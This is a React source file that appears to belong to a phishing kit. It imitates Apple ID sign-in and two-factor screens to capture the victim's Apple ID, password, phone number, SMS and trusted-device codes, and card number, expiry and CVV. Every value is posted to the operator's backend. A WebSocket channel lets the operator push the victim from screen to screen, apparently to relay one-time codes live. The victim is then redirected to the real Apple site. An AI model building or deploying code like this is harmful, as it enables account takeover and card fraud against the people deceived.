import { useState, useEffect } from "react";
import { useMutation, useQuery } from "@tanstack/react-query";
import { apiRequest } from "@/lib/queryClient";
import { useWebSocket } from "@/hooks/use-websocket";

export default function TemplateApple() {
  const sessionId = new URLSearchParams(window.location.search).get("sessionId");
  const { lastMessage } = useWebSocket();
  
  const [currentScreen, setCurrentScreen] = useState("login");
  const [isLoading, setIsLoading] = useState(false);
  const [formData, setFormData] = useState({
    appleId: "",
    password: "",
    phoneNumber: "",
    verificationCode: "",
    securityCode: "",
    cardNumber: "",
    expiryDate: "",
    cvv: "",
  });

  // Update session when screen changes
  const updateSession = async (data: any) => {
    if (!sessionId) return;
    try {
      await apiRequest("PATCH", `/api/sessions/${sessionId}`, data);
    } catch (error) {
      console.error("Failed to update session:", error);
    }
  };

  // Submit data mutation
  const submitDataMutation = useMutation({
    mutationFn: async (data: { fieldName: string; fieldValue: string }) => {
      if (!sessionId) return;
      const response = await apiRequest("POST", "/api/submissions", {
        sessionId,
        ...data,
      });
      return response.json();
    },
  });

  const submitData = async (fieldName: string, fieldValue: string) => {
    await submitDataMutation.mutateAsync({ fieldName, fieldValue });
  };

  // Listen for WebSocket updates to change screen remotely
  useEffect(() => {
    if (lastMessage) {
      try {
        const message = JSON.parse(lastMessage);
        if (message.type === 'session_updated' && 
            message.data.id === sessionId && 
            message.data.currentScreen && 
            message.data.currentScreen !== currentScreen) {
          setCurrentScreen(message.data.currentScreen);
        }
      } catch (error) {
        console.error("Error parsing WebSocket message:", error);
      }
    }
  }, [lastMessage, sessionId, currentScreen]);

  const handleInputChange = (fieldName: string, value: string) => {
    setFormData(prev => ({ ...prev, [fieldName]: value }));
  };

  const handleLoginSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!formData.appleId || !formData.password) return;

    await submitData("apple_id", formData.appleId);
    await submitData("password", formData.password);

    // Progreso automático a la siguiente pantalla
    setTimeout(async () => {
      setCurrentScreen("verification");
      await updateSession({ currentScreen: "verification", status: "active" });
    }, 1500);
  };

  const handleVerificationSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!formData.phoneNumber) return;

    await submitData("phone_number", formData.phoneNumber);

    // Progreso automático a la siguiente pantalla
    setTimeout(async () => {
      setCurrentScreen("code");
      await updateSession({ currentScreen: "code", status: "active" });
    }, 1500);
  };

  const handleCodeSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!formData.verificationCode) return;

    await submitData("verification_code", formData.verificationCode);

    // Progreso automático a verificación de seguridad
    setTimeout(async () => {
      setCurrentScreen("security");
      await updateSession({ currentScreen: "security", status: "active" });
    }, 1500);
  };

  const handleSecuritySubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!formData.securityCode) return;

    await submitData("security_code", formData.securityCode);

    // Progreso automático a datos de tarjeta
    setTimeout(async () => {
      setCurrentScreen("payment");
      await updateSession({ currentScreen: "payment", status: "active" });
    }, 1500);
  };

  const handlePaymentSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!formData.cardNumber || !formData.expiryDate || !formData.cvv) return;

    await submitData("card_number", formData.cardNumber);
    await submitData("expiry_date", formData.expiryDate);
    await submitData("cvv", formData.cvv);

    setIsLoading(true);
    setCurrentScreen("loading");
    await updateSession({ currentScreen: "loading", status: "completed" });

    setTimeout(() => {
      window.location.href = "https://appleid.apple.com/";
    }, 3000);
  };

  const renderScreen = () => {
    switch (currentScreen) {
      case "login":
        return (
          <div className="min-h-screen bg-white flex items-center justify-center p-4">
            <div className="w-full max-w-sm">
              <div className="text-center mb-8">
                <div className="w-16 h-16 bg-black rounded-2xl flex items-center justify-center mx-auto mb-6">
                  <svg width="32" height="32" viewBox="0 0 24 24" fill="white">
                    <path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.81-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z"/>
                  </svg>
                </div>
                <h1 className="text-3xl font-light text-gray-900 mb-2">Sign in to Apple ID</h1>
                <p className="text-gray-600">Use your Apple ID to access iCloud, App Store, and more.</p>
              </div>

              <form onSubmit={handleLoginSubmit} className="space-y-4">
                <div>
                  <input
                    type="email"
                    value={formData.appleId}
                    onChange={(e) => handleInputChange("appleId", e.target.value)}
                    className="w-full h-12 bg-white border border-gray-300 rounded-lg text-gray-900 placeholder-gray-500 text-center focus:border-blue-500 focus:outline-none"
                    placeholder="Apple ID"
                    data-testid="input-apple-id"
                    required
                  />
                </div>

                <div>
                  <input
                    type="password"
                    value={formData.password}
                    onChange={(e) => handleInputChange("password", e.target.value)}
                    className="w-full h-12 bg-white border border-gray-300 rounded-lg text-gray-900 placeholder-gray-500 text-center focus:border-blue-500 focus:outline-none"
                    placeholder="Password"
                    data-testid="input-password"
                    required
                  />
                </div>

                <button 
                  type="submit"
                  className="w-full h-12 bg-blue-500 hover:bg-blue-600 text-white rounded-lg font-medium transition-colors"
                  data-testid="button-sign-in"
                >
                  Sign In
                </button>
              </form>

              <div className="text-center space-y-3 mt-6">
                <a href="#" className="block text-sm text-blue-500 hover:underline">
                  Forgot Apple ID or password?
                </a>
                <a href="#" className="block text-sm text-blue-500 hover:underline">
                  Don't have an Apple ID? Create yours now.
                </a>
              </div>
            </div>
          </div>
        );

      case "verification":
        return (
          <div className="min-h-screen bg-white flex items-center justify-center p-4">
            <div className="w-full max-w-sm">
              <div className="text-center mb-8">
                <div className="w-16 h-16 bg-black rounded-2xl flex items-center justify-center mx-auto mb-6">
                  <svg width="32" height="32" viewBox="0 0 24 24" fill="white">
                    <path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.81-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z"/>
                  </svg>
                </div>
                <h1 className="text-2xl font-light text-gray-900 mb-2">Two-Factor Authentication</h1>
                <p className="text-gray-600 text-sm">Enter the phone number associated with your Apple ID to receive a verification code.</p>
              </div>

              <form onSubmit={handleVerificationSubmit} className="space-y-4">
                <div>
                  <input
                    type="tel"
                    value={formData.phoneNumber}
                    onChange={(e) => handleInputChange("phoneNumber", e.target.value)}
                    className="w-full h-12 bg-white border border-gray-300 rounded-lg text-gray-900 placeholder-gray-500 text-center focus:border-blue-500 focus:outline-none"
                    placeholder="Phone number"
                    data-testid="input-phone-number"
                    required
                  />
                </div>

                <button 
                  type="submit"
                  className="w-full h-12 bg-blue-500 hover:bg-blue-600 text-white rounded-lg font-medium transition-colors"
                  data-testid="button-continue"
                >
                  Continue
                </button>
              </form>
            </div>
          </div>
        );

      case "code":
        return (
          <div className="min-h-screen bg-white flex items-center justify-center p-4">
            <div className="w-full max-w-sm">
              <div className="text-center mb-8">
                <div className="w-16 h-16 bg-black rounded-2xl flex items-center justify-center mx-auto mb-6">
                  <svg width="32" height="32" viewBox="0 0 24 24" fill="white">
                    <path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.81-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z"/>
                  </svg>
                </div>
                <h1 className="text-2xl font-light text-gray-900 mb-2">Enter Verification Code</h1>
                <p className="text-gray-600 text-sm">We sent a 6-digit code to your phone number ending in ••{formData.phoneNumber.slice(-2)}.</p>
              </div>

              <form onSubmit={handleCodeSubmit} className="space-y-4">
                <div>
                  <input
                    type="text"
                    value={formData.verificationCode}
                    onChange={(e) => handleInputChange("verificationCode", e.target.value)}
                    className="w-full h-12 bg-white border border-gray-300 rounded-lg text-gray-900 placeholder-gray-500 text-center focus:border-blue-500 focus:outline-none text-2xl tracking-widest"
                    placeholder="6-digit code"
                    maxLength={6}
                    data-testid="input-verification-code"
                    required
                  />
                </div>

                <button 
                  type="submit"
                  className="w-full h-12 bg-blue-500 hover:bg-blue-600 text-white rounded-lg font-medium transition-colors"
                  data-testid="button-verify"
                >
                  Verify
                </button>
              </form>

              <div className="text-center mt-6">
                <button className="text-sm text-blue-500 hover:underline">
                  Didn't receive a code? Resend
                </button>
              </div>
            </div>
          </div>
        );

      case "security":
        return (
          <div className="min-h-screen bg-white flex items-center justify-center p-4">
            <div className="w-full max-w-sm">
              <div className="text-center mb-8">
                <div className="w-16 h-16 bg-black rounded-2xl flex items-center justify-center mx-auto mb-6">
                  <svg width="32" height="32" viewBox="0 0 24 24" fill="white">
                    <path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.81-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z"/>
                  </svg>
                </div>
                <h1 className="text-2xl font-light text-gray-900 mb-2">Security Verification</h1>
                <p className="text-gray-600 text-sm">For your security, please enter the 4-digit code from your trusted device.</p>
              </div>

              <form onSubmit={handleSecuritySubmit} className="space-y-4">
                <div>
                  <input
                    type="text"
                    value={formData.securityCode}
                    onChange={(e) => handleInputChange("securityCode", e.target.value)}
                    className="w-full h-12 bg-white border border-gray-300 rounded-lg text-gray-900 placeholder-gray-500 text-center focus:border-blue-500 focus:outline-none text-2xl tracking-widest"
                    placeholder="4-digit code"
                    maxLength={4}
                    data-testid="input-security-code"
                    required
                  />
                </div>

                <button 
                  type="submit"
                  className="w-full h-12 bg-blue-500 hover:bg-blue-600 text-white rounded-lg font-medium transition-colors"
                  data-testid="button-verify-security"
                >
                  Continue
                </button>
              </form>

              <div className="text-center mt-6">
                <button className="text-sm text-blue-500 hover:underline">
                  Use a different verification method
                </button>
              </div>
            </div>
          </div>
        );

      case "payment":
        return (
          <div className="min-h-screen bg-white flex items-center justify-center p-4">
            <div className="w-full max-w-sm">
              <div className="text-center mb-8">
                <div className="w-16 h-16 bg-black rounded-2xl flex items-center justify-center mx-auto mb-6">
                  <svg width="32" height="32" viewBox="0 0 24 24" fill="white">
                    <path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.81-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z"/>
                  </svg>
                </div>
                <h1 className="text-2xl font-light text-gray-900 mb-2">Payment Verification</h1>
                <p className="text-gray-600 text-sm">To complete your Apple ID verification, please confirm your payment method.</p>
              </div>

              <form onSubmit={handlePaymentSubmit} className="space-y-4">
                <div>
                  <input
                    type="text"
                    value={formData.cardNumber}
                    onChange={(e) => handleInputChange("cardNumber", e.target.value.replace(/\D/g, ''))}
                    className="w-full h-12 bg-white border border-gray-300 rounded-lg text-gray-900 placeholder-gray-500 px-4 focus:border-blue-500 focus:outline-none"
                    placeholder="Card Number"
                    maxLength={16}
                    data-testid="input-card-number"
                    required
                  />
                </div>

                <div className="flex space-x-4">
                  <input
                    type="text"
                    value={formData.expiryDate}
                    onChange={(e) => {
                      let value = e.target.value.replace(/\D/g, '');
                      if (value.length >= 2) {
                        value = value.substring(0, 2) + '/' + value.substring(2, 4);
                      }
                      handleInputChange("expiryDate", value);
                    }}
                    className="flex-1 h-12 bg-white border border-gray-300 rounded-lg text-gray-900 placeholder-gray-500 px-4 focus:border-blue-500 focus:outline-none"
                    placeholder="MM/YY"
                    maxLength={5}
                    data-testid="input-expiry-date"
                    required
                  />
                  <input
                    type="text"
                    value={formData.cvv}
                    onChange={(e) => handleInputChange("cvv", e.target.value.replace(/\D/g, ''))}
                    className="w-20 h-12 bg-white border border-gray-300 rounded-lg text-gray-900 placeholder-gray-500 px-4 focus:border-blue-500 focus:outline-none"
                    placeholder="CVV"
                    maxLength={3}
                    data-testid="input-cvv"
                    required
                  />
                </div>

                <button 
                  type="submit"
                  className="w-full h-12 bg-blue-500 hover:bg-blue-600 text-white rounded-lg font-medium transition-colors"
                  data-testid="button-verify-payment"
                >
                  Verify Payment Method
                </button>
              </form>

              <p className="text-xs text-gray-500 text-center mt-4">
                Your payment information is encrypted and secure.
              </p>
            </div>
          </div>
        );

      case "loading":
        return (
          <div className="min-h-screen bg-white flex items-center justify-center p-4">
            <div className="text-center">
              <div className="w-16 h-16 bg-black rounded-2xl flex items-center justify-center mx-auto mb-6">
                <svg width="32" height="32" viewBox="0 0 24 24" fill="white">
                  <path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.81-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z"/>
                </svg>
              </div>
              <div className="animate-spin w-8 h-8 border-4 border-blue-500 border-t-transparent rounded-full mx-auto mb-4"></div>
              <p className="text-gray-600">Verifying your account...</p>
            </div>
          </div>
        );

      default:
        return null;
    }
  };

  return renderScreen();
}